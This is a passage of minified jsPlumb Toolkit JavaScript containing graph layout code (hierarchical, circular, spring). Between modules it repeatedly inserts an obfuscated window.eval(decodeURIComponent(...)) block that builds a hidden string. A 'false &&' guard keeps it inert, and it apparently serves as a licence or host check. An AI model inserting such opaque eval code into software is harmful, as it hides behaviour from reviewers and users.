i(n,o)},t.manage=function(e,n,o,i,r,s){t.managers[o]&&t.managers[o][e]&&t.managers[o][e](n,i,r)},"undefined"!=typeof exports&&(exports.jsPlumbToolkitIO=t)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){var t=this,e=t.jsPlumbToolkit;e.Support={ingest:function(n){var o=n.jsPlumb||t.jsPlumb;if(!o.getContainer())throw new TypeError("No Container set on jsPlumb instance. Cannot continue.");var i=e.newInstance(),r=o.select(),s={},a=function(){return"default"},l=n.idFunction||function(t){return o.getId(t)},d=n.typeFunction||a,u=n.idFunction||function(t){return t.id},c=n.edgeTypeFunction||a,h=!1!==n.render,p=function(t){var e=l(t),n=d(t),r=o.getId(t);null==s[r]&&(s[r]=i.addNode({id:e,type:n},null,!0),t.jtk={node:s[r]})};if(n.nodeSelector)for(var f=o.getContainer().querySelectorAll(n.nodeSelector),g=0;g<f.length;g++){var _=o.getId(f[g]);p(f[g]),o.manage(_,f[g])}var b=o.getManagedElements();for(var _ in b)p(b[_].el);if(r.each(function(t){var e,n,o,r,a;n=s[(e=t).sourceId],o=s[e.targetId],r=u(e),a=c(e),e.edge=i.addEdge({source:n,target:o,data:{id:r,type:a}},null,!0)}),h){var v=t.jsPlumb.extend({},n.renderParams||{});v.jsPlumbInstance=o,v.container=o.getContainer();var m=i.render(v);return m.ingest=function(t){p(t),m.importNode(t,l(t))},m}return i}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this,e=t.jsPlumbToolkit.Layouts={Decorators:{}},n=t.jsPlumbUtil;e.AbstractLayout=function(o){function i(t,e){if(!C[t]){var n=e||[0,0];C[t]={id:t,size:L(t),position:n,xmax:n[0],ymax:n[1],xmin:n[0],ymin:n[1]}}return C[t]}function r(t){delete C[t]}function s(){S.length=0,A.length=0,I.length=0,T.length=0;for(var t in C)R(S,C[t],"xmax"),R(I,C[t],"ymax"),R(A,C[t],"xmin"),R(T,C[t],"ymin");if(m=A.length>0?A[0].xmin:0,j=S.length>0?S[S.length-1].xmax:0,w=T.length>0?T[0].ymin:0,y=I.length>0?I[I.length-1].ymax:0,!f&&(m<0||w<0)){var e=m<0?m:0,n=w<0?w:0;if(e<0||n<0){for(var o in b)b[o][0]-=e,b[o][1]-=n;for(var i in C)C[i].position[0]-=e,C[i].xmin-=e,C[i].xmax-=e,C[i].position[1]-=n,C[i].ymin-=n,C[i].ymax-=n;m-=e,w-=n,j-=e,y-=n}}}function a(t,e){t.xmax=t.position[0]+t.size[0],t.ymax=t.position[1]+t.size[1],t.xmin=t.position[0],t.ymin=t.position[1],e&&s()}var l=this,d=(o=o||{}).adapter,u=o.parameters||{},c=o.getElementForNode,h=t.Farahey.getInstance({getPosition:function(t){var e=b[t.id];return{left:e[0],top:e[1]}},getSize:function(t){return x[t.id]},getId:function(t){return t.id},setPosition:function(t,e){z(t.id,e.left,e.top)},padding:u.padding,filter:function(t){return(!P[t]||!P[t].group)&&(!l.canMagnetize||l.canMagnetize(t))}}),p=!1!==o.magnetized&&(l.defaultMagnetized||!0===o.magnetize),f=!1!==o.negativeValuesAllowed;this.decorators=function(t,o,i){if(null==t)return[];for(var r=[],s=0;s<t.length;s++){var a=(l=t[s],u=void 0,d="string"==typeof l?l:l[0],u=e.Decorators[d],c="string"==typeof l?{}:l[1],u?new u(c,o,i):(n.log("Decorator ["+d+"] nor registered on jsPlumbToolkit.Layouts.Decorators. Not fatal."),null));a&&r.push(a)}var l,d,u,c;return r}(o.decorators,o.adapter,o.container),this.adapter=o.adapter;var g=o.jsPlumb||t.jsPlumb,_=o.jsPlumbToolkit,b={},v=[],m=1/0,w=1/0,j=-1/0,y=-1/0,P={},E={},x={},C={},S=[],I=[],A=[],T=[],k=o.container,D=g.getSize(k),N=o.width||D[0],M=o.height||D[1],O=!1,F=function(){O=!1,m=1/0,j=-1/0,w=1/0,y=-1/0;for(var t=0;t<l.decorators.length;t++)l.decorators[t].reset({remove:g.remove});b={},v.splice(0),C={},A.length=0,T.length=0,S.length=0,I.length=0,x={},h.reset(),l.reset&&l.reset()};this.getMagnetizedElements=function(){return h.getElements()},this.magnetize=function(t){var e=(t=t||{}).event?"executeAtEvent":t.origin?"execute":"executeAtCenter",n=t.event?[t.event,t.options]:t.origin?[t.origin,t.options]:[t.options];t.force&&this.forceMagnetize&&this.forceMagnetize(),h[e].apply(h,n),B(g.repaintEverything)},this.nodeAdded=function(t,e){if(l.adapter.filter(t.node)){var n=e&&e.position?e.position:t.node.data&&t.node.data.left&&t.node.data.top?t.node.data:l.adapter.getOffset(t.el);if(this._nodeAdded){var o=this._nodeAdded(t,e);o&&(n.left=o[0],n.top=o[1])}P[t.node.id]=t.node,z(t.node.id,n.left,n.top),L(t.node.id,t.el),h.addElement(t.node)}},this.nodeRemoved=function(t){delete b[t.node.id],delete x[t.node.id],delete P[t.node.id],r(t.node.id),this._nodeRemoved&&this._nodeRemoved(t.node),h.removeElement(t.node)},this.groupAdded=function(t,e){if(l.adapter.filter(t.group)){var n=e&&e.position?e.position:t.group.data&&t.group.data.left&&t.group.data.top?t.group.data:l.adapter.getOffset(t.el);if(this._groupAdded){var o=this._groupAdded(t,e);o&&(n.left=o[0],n.top=o[1])}E[t.group.id]=t.group,z(t.group.id,n.left,n.top),L(t.group.id,t.el),h.addElement(t.group)}},this.groupRemoved=function(t){delete b[t.group.id],delete x[t.group.id],delete E[t.group.id],r(t.group.id),this._groupRemoved&&this._groupRemoved(t.group),h.removeElement(t.group)};var L=function(t,e){var n=x[t];return n||(null!=(e=e||c(t))?(n=g.getSize(e),x[t]=n):n=[0,0]),n},R=function(t,e,n){t.push(e);for(var o=t.length-1,i=t[o];o>0&&i[n]<t[o-1][n];)t[o]=t[o-1],o-=1;return t[o]=i,o},G=function(t,e,n){if(null!=t){e=parseFloat(e),n=parseFloat(n);var o=b[t];o||(o=b[t]=[0,0],v.push([o,t]));var r=i(t,[e,n]);r.position[0]=e,r.position[1]=n,a(r),b[t]=[e,n]}},U=function(t,e,n){P[t]&&l._nodeMoved?l._nodeMoved(t,e,n):E[t]&&l._groupMoved&&l._groupMoved(t,e,n)},z=(this.setMagnetizedPosition=function(t,e,n,o){G(t,e,n),this.magnetize({options:{filter:function(e){return e===t},padding:[5,5],exclude:function(t,e){return null!=e.group},excludeFocus:!0}});var i=this.getPosition(t);return o&&U(t,i[0],i[1]),i},function(t,e,n,o){G(t,e,n),o&&U(t,e,n)}),V=function(t){var e=c(t);if(null!=e){var n=i(t).position;return l.adapter.setElementPosition(e,n[0],n[1]),n.concat(L(t))}return null}.bind(this),B=this.draw=function(t){for(var e in C)V(e);for(var n=0;n<l.decorators.length;n++)l.decorators[n].decorate({adapter:l.adapter,layout:l,append:function(t,e,n){l.adapter.append(t,e,n,!0)},setAbsolutePosition:l.adapter.setAbsolutePosition,toolkit:_,jsPlumb:g,bounds:[m,w,j,y],floatElement:l.adapter.floatElement,fixElement:l.adapter.fixElement});t&&t()};this.setPosition=function(t,e,n){z(t,e,n,!0),s()},this.bb=function(t){console.log(t);var e=function(t){var e=1/0,n=1/0,o=-1/0,i=-1/0;for(var r in t)e=Math.min(e,t[r][0]),o=Math.max(o,t[r][0]),n=Math.min(n,t[r][1]),i=Math.max(i,t[r][1]);return[[e,n],[o,i],Math.abs(e-o),Math.abs(n-i)]}(b);(function(){for(var t in b)console.log(t,b[t][0],b[t][1])})(),console.log(e[0],e[1],e[2],e[3])};var H=this.getPositions=function(){return b},W=(this.getPosition=function(t){return b[t]},this.getExtents=function(){return[m,w,j,y]}),X=(this.getSize=function(t){return x[t]},function(t,e){x[t]=e;var n=i(t);n.size=e,a(n,!0)});this.setSize=X,this.begin=function(t,e){},this.end=function(t,e){};var Y=function(e){if(null!=_){n=t.jsPlumb.extend({padding:[0,0]},l.defaultParameters||{}),t.jsPlumb.extend(n,u||{}),u=n,h.setElements(d.getElements()),this.begin&&this.begin(_,u);for(;!O;)this.step(_,u);s(),B(function(){p&&l.magnetize(),l.end&&l.end(_,u),e&&e()})}var n}.bind(this);return this.relayout=function(t,e){F(),null!=t&&(u=t),Y(e)},this.layout=function(t){O=!1,Y(t)},this.clear=function(){F()},{adapter:o.adapter,jsPlumb:g,toolkit:_,getPosition:function(t,e,n,o){var i=b[t];if(!i){if(null!=e&&null!=n)i=[e,n];else{if(o)return null;i=[Math.floor(Math.random()*(N+1)),Math.floor(Math.random()*(M+1))]}z(t,i[0],i[1])}return i},setPosition:z,getRandomPosition:function(t,e,n,o){e=e||10,n=n||10;var r=Math.floor(Math.random()*e),s=Math.floor(Math.random()*n),l=i(t,[r,s]);return l.position=[r,s],a(l,!0!==o),b[t]=[r,s],[r,s]},getSize:L,setSize:X,getPositions:H,setPositions:function(t){b=t},getExtents:W,width:N,height:M,reset:F,draw:B,setDone:function(t){O=t}}},e.EmptyLayout=function(t){var e={},n={};this.refresh=this.relayout=this.layout=function(){this.clear();var n,o,i=t.getElements();for(o=0;o<i.length;o++)n=i[o],e[n.id]=[0,0]},this.nodeRemoved=this.groupRemoved=function(t){delete e[t.id]},this.nodeAdded=this.groupAdded=function(t){e[t.id]=!1},this.getPositions=function(){return e},this.getPosition=function(t){return e[t]},this.setPosition=function(t,n,o){e[t]=[n,o]},this.getExtents=function(){return[0,0,0,0]},this.clear=function(){},this.getMagnetizedElements=function(){return[]},this.setSize=function(t,e){n[t]=e},this.getSize=function(t){return n[t]}},e.Mistletoe=function(o){if(!o.parameters.layout)throw"No layout specified for MistletoeLayout";var i={},r=t.jsPlumb.extend({},o);r.getElementForNode=function(t){return i[t]};var s,a,l,d=e.AbstractLayout.apply(this,[r]),u=o.parameters.layout,c=function(){d.setPositions(u.getPositions()),d.draw(),this.fire("redraw")}.bind(this);n.EventGenerator.apply(this,arguments),this.map=function(t,e){i[t]=e};var h=function(){i={},s=u.layout,a=u.relayout,l=u.clear,u.layout=function(){s.apply(u,arguments),c()},u.relayout=function(){d.reset(),a.apply(u,arguments),c()},u.clear=function(){l.apply(u,arguments),d.reset()}};h(),this.setHostLayout=function(t){u=t,h()}};var o=function(t){t=t||{};var n=e.AbstractLayout.apply(this,arguments),o=function(e,n){return(t.locationFunction||function(t){return[t.data.left,t.data.top]})(e)},i=function(t,e,i){for(var r=n.adapter[t](),s=r.length,a=0;a<s;a++){var l=r[a],d=l.getFullId(),u=n.getPosition(d,null,null,!0);null==u&&(u=o(l)),this.setPosition(d,u[0],u[1],!0)}}.bind(this);return this.begin=function(t,e){i("getElements",t,e)},this._nodeAdded=function(e,n){return o(e.node,t.parameters)},this._groupAdded=function(e,n){return o(e.group,t.parameters)},this.getAbsolutePosition=function(t,e){return o(t)},this.step=function(){n.setDone(!0)},n};n.extend(o,e.AbstractLayout),e.AbsoluteBackedLayout=o,e.Absolute=function(t){e.AbsoluteBackedLayout.apply(this,arguments)},n.extend(e.Absolute,e.AbsoluteBackedLayout);var i=function(t){var n=e.AbstractLayout.apply(this,arguments),o=t.adapter;return this.begin=function(e,i){i.ignoreLoops=!(!1===t.ignoreLoops),i.getRootNode=i.getRootNode||function(e){if(!1!==t.multipleRoots)return e.filter(function(t){return("Node"===t.objectType||"Group"===t.objectType)&&0===t.getTargetEdges().length&&o.filter(t)}).getAll();var i=n.adapter.getElements();return i.length>0?i[0]:null},i.getChildEdges=i.getChildEdges||function(e,i){return n.toolkit.getAllEdgesFor(e,function(n){var i=n.target.getNode?n.target.getNode():n.target;return(n.source===e||!0!==t.ignorePorts&&n.source.getNode&&n.source.getNode()===e)&&o.filter(i)})},i.rootNode=i.getRootNode(e),i.rootNode||n.setDone(!0)},n};n.extend(i,e.AbstractLayout),e.AbstractHierarchicalLayout=i}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkit.Layouts,e=this.Farahey;t.Circular=function(n){n=n||{};var o=t.AbstractLayout.apply(this,arguments),i=!!n.parameters&&!0===n.parameters.centerRootNode;n.group,this.defaultParameters={padding:30,locationFunction:n.locationFunction},this.step=function(t,n){var r=o.adapter.getElements();if(i&&(r=r.slice(1)),0!==r.length){var s,a,l=10,d=2*Math.PI/r.length,u=-Math.PI/2;if(i){var c=o.getSize(r[0].id);l=Math.max(c[0],c[1])+80}for(s=0;s<r.length;s++)if(a=r[s],o.setPosition(a.id,0+Math.sin(u)*l,0+Math.cos(u)*l,!0),u+=d,s>0){var h=r[s-1],p=o.getSize(h.id),f=o.getPosition(h.id),g={x:f[0]-n.padding,y:f[1]-n.padding,w:p[0]+2*n.padding,h:p[1]+2*n.padding},_=r[s],b=o.getSize(_.id),v=o.getPosition(_.id),m={x:v[0]-n.padding,y:v[1]-n.padding,w:b[0]+2*n.padding,h:b[1]+2*n.padding},w=e.calculateSpacingAdjustment(g,m),j=[f[0]+p[0]/2,f[1]+p[1]/2],y=[v[0]+w.left+b[0]/2,v[1]+w.top+ +b[1]/2],P=Math.sqrt(Math.pow(j[0]-y[0],2)+Math.pow(j[1]-y[1],2));l=Math.max(l,P/2/Math.sin(d/2))}for(s=0;s<r.length;s++)a=r[s],o.setPosition(a.id,0+Math.sin(u)*l,0+Math.cos(u)*l,!0),u+=d;o.setDone(!0)}else o.setDone(!0)}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkit.Layouts,e=this.jsPlumbUtil;t.Hierarchical=function(n){var o,i,r,s,a,l,d=t.AbstractHierarchicalLayout.apply(this,arguments),u=[],c=null!=n.parameters&&n.parameters.compress,h=null!=n.parameters&&!0===n.parameters.invert,p=[],f=[],g=d.toolkit.getNodeId,_=function(t,e,n,o,i){var a,l,d=((l=p[a=n])||(l={nodes:[],pointer:0},p[a]=l),l),c={node:t,parent:o,childGroup:i,loc:d.pointer,index:d.nodes.length,dimensions:e,size:e[r]},h=e[0==r?1:0];return null==u[n]?u[n]=h:u[n]=Math.max(u[n],h),d.pointer+=e[r]+s[r],d.nodes.push(c),c},b=function(t){if(t.size>0){var e=t.parent.loc+t.parent.size/2-(t.size-s[r])/2,n=f[t.depth],o=-1/0,i=0;if(null!=n&&n.length>0){var a=n[n.length-1],l=a.nodes[a.nodes.length-1];o=l.loc+l.size+s[r]}e>=o?t.loc=e:(i=o-e,t.loc=o);for(var d=t.loc,u=0;u<t.nodes.length;u++)t.nodes[u].loc=d,d+=t.nodes[u].size,d+=s[r];i>0&&m(t),c=t,h=t.depth,(p=f[h])||(p=[],f[h]=p),c.index=p.length,p.push(c)}var c,h,p},v=function(t){var e=(t.nodes[0].loc+(t.nodes[t.nodes.length-1].loc+t.nodes[t.nodes.length-1].size))/2-t.parent.size/2,n=e-t.parent.loc;if(t.parent.loc=e,!t.parent.root)for(var o=t.parent.childGroup,i=t.parent.childGroupIndex+1;i<o.nodes.length;i++)o.nodes[i].loc+=n},m=function(t){for(var e=t;null!=e;)v(e),e=e.parent.childGroup},w=function(t,e){if(!a[t.node.id]){a[t.node.id]=!0;var n,o=l(t.node,d.toolkit),i={nodes:[],loc:0,size:0,parent:t,depth:e+1},u=[],c={};for(n=0;n<o.length;n++){var h=(v=t.node,(m=o[n]).source===v||m.source.getNode&&m.source.getNode()===v?o[n].target:o[n].source);if(h.getNode&&(h=h.getNode()),null!=(h=d.toolkit.getNode(h))&&h!==t.node&&!c[h.id]){var p=d.getSize(g(h)),f=_(h,p,e+1,t,i);f.childGroupIndex=i.nodes.length,i.nodes.push(f),i.size+=p[r]+s[r],u.push(f),c[h.id]=!0}}for(b(i),n=0;n<u.length;n++)w(u[n],e+1)}var v,m};this.defaultParameters={padding:[60,60],orientation:"horizontal",border:0,locationFunction:n.locationFunction};var j=this.begin;this.begin=function(t,e){j.apply(this,arguments),o=e.orientation,r=(i="horizontal"===o)?0:1,i?"width":"height",s=e.padding,p.length=0,f.length=0,a={},l=e.getChildEdges},this.step=function(t,n){for(var o,i,a,l=e.isArray(n.rootNode)?n.rootNode:[n.rootNode],f=0;f<l.length;f++){o=l[f];var b=d.getSize(o.id),v=_(o,b,0,null,null);v.root=!0,w(v,0,null);var m,j,y=0,P=function(t,e){var n=0===r?1:0;return c&&t.parent?d.getPosition(g(t.parent.node))[n]+t.parent.dimensions[n]+s[n]:e};for(i=0;i<p.length;i++){for(p[i].otherAxis=y,a=0;a<p[i].nodes.length;a++)m=0==r?p[i].nodes[a].loc:P(p[i].nodes[a],y),p[i].nodes[a].parent&&d.getPosition(g(p[i].nodes[a].parent.node)),j=1==r?p[i].nodes[a].loc:P(p[i].nodes[a],y),d.setPosition(g(p[i].nodes[a].node),m,j,!0);h?i<p.length-1&&(p[i].otherAxisSize=u[i+1]+s[0==r?1:0],y-=p[i].otherAxisSize):(p[i].otherAxisSize=u[i]+s[0==r?1:0],y+=p[i].otherAxisSize)}}d.setDone(!0)},this.getHierarchy=function(){return p},this.getOrientation=function(){return o};var y=this.nodeRemoved;this.nodeRemoved=function(){p=[],y.apply(this,arguments)},this.getPadding=function(){return s}},e.extend(t.Hierarchical,t.AbstractHierarchicalLayout)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){this.jsPlumbToolkit.Layouts.Decorators.Hierarchy=function(t){var e,n=[];this.reset=function(t){for(var e=0;e<n.length;e++)t.remove(n[e]);n.length=0},this.decorate=function(t){if(t.bounds[0]!=1/0){var n=t.layout.getHierarchy();e=(t.layout.getPadding()||[60,60])["horizontal"===o?0:1];for(var o=t.layout.getOrientation(),i="horizontal"===o?["width","height",t.bounds[2]-t.bounds[0]]:["height","width",t.bounds[3]-t.bounds[1]],r=0;r<n.length;r++){var s=document.createElement("div");t.append(s),s.className="level "+(r%2?"odd":"even"),s.style[i[0]]=i[2]+2*e+"px",s.style[i[1]]=n[r].otherAxisSize+"px";var a="horizontal"===o?[t.bounds[0]-e,n[r].otherAxis-e/2]:[n[r].otherAxis-e/2,t.bounds[1]-e];t.setAbsolutePosition(s,a)}}}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkit.Layouts,e=this.jsPlumbUtil;t.Spring=function(e){this.defaultMagnetized=!0;var n=t.AbsoluteBackedLayout.apply(this,arguments);e.group,this.defaultParameters={padding:[50,50],iterations:500,maxRepulsiveForceDistance:6,k:2,c:.01,maxVertexMovement:.5,locationFunction:e.locationFunction};var o,i=this.defaultParameters,r={},s=!1!==e.absoluteBacked,a=0,l=1/0,d=-1/0,u=1/0,c=-1/0,h=1,p=1,f=0,g=function(t){t.getNode&&(t=t.getNode());var e=r[t.id];if(!e){var o=n.getRandomPosition(t.id,.5,.5,!0);e=r[t.id]={id:t.id,n:t,sp:o,p:[o[0],o[1]],f:[0,0]}}return e},_=function(t,e,n){l=Math.min(l,e),u=Math.min(u,n),d=Math.max(d,e),c=Math.max(c,n),t.p[0]=e,t.p[1]=n},b=function(t,e){if(!t.locked||!e.locked){var n=e.p[0]-t.p[0],o=e.p[1]-t.p[1],r=n*n+o*o;r<.01&&(r=(n=.1*Math.random()+.1)*n+(o=.1*Math.random()+.1)*o);var s=Math.sqrt(r);if(s<i.maxRepulsiveForceDistance){f++;var a=i.k*i.k/s,l=a*n/s,d=a*o/s;e.f[0]+=e.locked?0:(t.locked?2:1)*l,e.f[1]+=e.locked?0:(t.locked?2:1)*d,t.f[0]-=t.locked?0:(e.locked?2:1)*l,t.f[1]-=t.locked?0:(e.locked?2:1)*d}}},v=function(t,e){var n=g(e.target);if(!t.locked||!n.locked){f++;var o=n.p[0]-t.p[0],r=n.p[1]-t.p[1],s=o*o+r*r;s<.01&&(s=(o=.1*Math.random()+.1)*o+(r=.1*Math.random()+.1)*r);var a=Math.sqrt(s);a>i.maxRepulsiveForceDistance&&(s=(a=i.maxRepulsiveForceDistance)*a);var l=(s-i.k*i.k)/i.k;(void 0==e.weight||e.weight<1)&&(e.weight=1);var d=(l*=.5*Math.log(e.weight)+1)*o/a,u=l*r/a;n.f[0]-=n.locked?0:(t.locked?2:1)*d,n.f[1]-=n.locked?0:(t.locked?2:1)*u,t.f[0]+=t.locked?0:(n.locked?2:1)*d,t.f[1]+=t.locked?0:(n.locked?2:1)*u}},m=function(t){return[.19*n.width+(t[0]-l)*h,.19*n.height+(t[1]-u)*p]};this._nodeMoved=this._groupMoved=function(t,e,o){var i,s=r[t];s&&(s.sp=[e,o],s.p=(i=s.sp,[l+(i[0]-.19*n.width)/h,u+(i[1]-.19*n.height)/p]))},this.forceMagnetize=function(){for(var t in r)r[t].locked=!1},this.canMagnetize=function(t){return r[t]&&!0!==r[t].locked},this.reset=function(){r={},a=0,l=u=1/0,d=c=-1/0},this._nodeRemoved=this._groupRemoved=function(t){delete r[t.id]},this._nodeAdded=this._groupAdded=function(t,e){if(e&&e.position){var o=g(t.node||t.group);o&&(o.locked=!0,n.setPosition(o.id,e.position.left,e.position.top,!0))}},this.begin=function(t,e){a=0,o=[],Array.prototype.push.apply(o,n.adapter.getElements())},this.step=function(t,e){var w,j=[],y=function(t){return j[t]?j[t]:(j[t]=g(o[t]),j[t])};for(f=0,w=0;w<o.length;w++){var P=y(w);if(s&&!P.locked){var E=this.getAbsolutePosition(P.n,e);if(null!=E&&2===E.length&&null!=E[0]&&null!=E[1]&&!isNaN(E[0])&&!isNaN(E[1])){_(P,E[0],E[1]),P.sp=P.p,n.setPosition(P.id,E[0],E[1],!0),P.locked=!0;continue}}for(var x=w+1;x<o.length;x++){var C=y(x);b(P,C)}for(var S=n.toolkit.getAllEdgesFor(P.n).filter(function(t){return n.adapter.filter(t.target)}),I=0;I<S.length;I++)v(P,S[I])}if(0!==f)for(w=0;w<o.length;w++){var 